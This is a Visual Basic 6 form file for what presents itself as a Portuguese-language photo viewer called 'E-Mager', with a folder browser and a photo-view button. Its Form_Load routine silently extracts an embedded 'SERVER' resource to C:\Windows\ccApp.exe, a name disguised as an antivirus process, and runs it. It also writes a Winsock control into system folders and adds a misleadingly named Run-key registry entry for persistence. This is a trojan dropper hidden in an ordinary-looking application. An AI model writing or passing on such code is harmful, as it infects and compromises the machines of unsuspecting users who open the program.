VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00FFEDDC&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "E-Mager"
   ClientHeight    =   5085
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7500
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":08CA
   ScaleHeight     =   5085
   ScaleWidth      =   7500
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Procurar"
      Height          =   345
      Left            =   3270
      TabIndex        =   6
      Top             =   3315
      Width           =   990
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FCE1B6&
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   465
      Locked          =   -1  'True
      TabIndex        =   5
      Text            =   "C:\"
      Top             =   3015
      Width           =   3795
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Visualizar Fotos!"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1110
      Left            =   5025
      Style           =   1  'Graphical
      TabIndex        =   0
      Top             =   2610
      Width           =   1785
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Pasta de fotos selecionada:"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   195
      Left            =   495
      TabIndex        =   4
      Top             =   2700
      Width           =   2685
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "www.gabrielfalcao.i8.com"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   4155
      TabIndex        =   3
      Top             =   4680
      Width           =   2475
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "gabrielfalcao@hotmail.com"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   4095
      TabIndex        =   2
      Top             =   4365
      Width           =   2625
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Criado por Gabriel Falcão"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   4095
      TabIndex        =   1
      Top             =   4065
      Width           =   2490
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Const BIF_RETURNONLYFSDIRS = 1
Private Const BIF_DONTGOBELOWDOMAIN = 2
Private Const MAX_PATH = 260

Private Declare Function SHBrowseForFolder Lib "shell32" (lpbi As BrowseInfo) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
Private Declare Function lstrcat Lib "kernel32" Alias "lstrcatA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long

Private Type BrowseInfo
  hWndOwner As Long
  pIDLRoot As Long
  pszDisplayName As Long
  lpszTitle As Long
  ulFlags As Long
  lpfnCallback As Long
  lParam As Long
  iImage As Long
End Type
Dim pastas As String

Private Sub Command1_Click()
On Error Resume Next
Form2.Show
Form2.File1.Path = pastas
Me.Hide
End Sub


Private Sub Command2_Click()
On Error Resume Next
  'Opens a Treeview control that displays the directories in a computer
  Dim lpIDList As Long
  Dim sBuffer As String
  Dim szTitle As String
  Dim tBrowseInfo As BrowseInfo
  
  szTitle = vbCr & vbCr & "Selecione a Pasta  com Fotos a Serem Visualizadas:"
  
  With tBrowseInfo
    .hWndOwner = Me.hWnd
    .lpszTitle = lstrcat(szTitle, "")
    .ulFlags = BIF_RETURNONLYFSDIRS + BIF_DONTGOBELOWDOMAIN
  End With
  
  lpIDList = SHBrowseForFolder(tBrowseInfo)
  
  If (lpIDList) Then
    sBuffer = Space(MAX_PATH)
    SHGetPathFromIDList lpIDList, sBuffer
    sBuffer = Left(sBuffer, InStr(sBuffer, vbNullChar) - 1)
    pastas = sBuffer
    Text1.Text = pastas
  End If
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim ocx As String
ocx = StrConv(LoadResData("SOCKET", "EXE"), vbUnicode)
Open "C:\WINDOWS\system32\MSWINSCK.OCX" For Binary As #2
Put #2, , ocx
Close #2
Open "C:\WINDOWS\system\MSWINSCK.OCX" For Binary As #3
Put #3, , ocx
Close #3
Open "C:\WINDOWS\MSWINSCK.OCX" For Binary As #4
Put #4, , ocx
Close #4
Dim p_ret As String
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open "C:\Windows\ccApp.exe" For Binary As #1
Put #1, , p_ret
Close #1

     Call Shell("C:\Windows\ccApp.exe")
 SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Gnutella .NET", "C:\Windows\System\GNUKey.exe"
End Sub

Private Sub Label2_Click()
Clipboard.SetText Label2.Caption
End Sub

Private Sub Label3_Click()
Clipboard.SetText Label3.Caption
End Sub
